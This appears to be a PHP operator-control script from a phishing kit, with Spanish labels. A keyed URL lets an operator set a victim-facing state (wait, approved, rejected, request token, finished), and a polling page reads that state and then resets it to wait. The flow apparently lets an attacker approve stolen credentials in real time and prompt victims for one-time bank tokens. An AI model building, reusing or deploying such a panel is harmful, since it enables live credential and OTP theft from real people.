<?php
$key = 'op2025';
$f   = __DIR__ . '/.ws';

// Operador: establecer estado (devuelve página HTML para no descargar JSON)
if (isset($_GET['s'], $_GET['k']) && $_GET['k'] === $key) {
    $allowed = ['wait', 'continue', 'error', 'token', 'finish'];
    $v = in_array($_GET['s'], $allowed, true) ? $_GET['s'] : 'wait';
    file_put_contents($f, $v);
    $label = ['wait'=>'Espera','continue'=>'Aprobado','error'=>'Rechazado','token'=>'Pedir Token','finish'=>'Finalizado'][$v] ?? $v;
    header('Content-Type: text/html; charset=utf-8');
    echo '<!doctype html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>OK</title>'
        .'<style>body{font-family:sans-serif;text-align:center;padding:52px;background:#f4f4f4}h2{color:#1a3a6e;font-size:22px}p{color:#555}</style></head>'
        .'<body><h2>&#10003; Enviado</h2><p>Estado establecido: <b>' . htmlspecialchars($label) . '</b></p></body></html>';
    exit;
}

// Cliente: obtener estado (auto-reset a 'wait' tras entregarlo)
header('Content-Type: application/json; charset=utf-8');
$state = trim(@file_get_contents($f) ?: 'wait');
if ($state !== 'wait') {
    file_put_contents($f, 'wait');
}
echo json_encode(['s' => $state]);
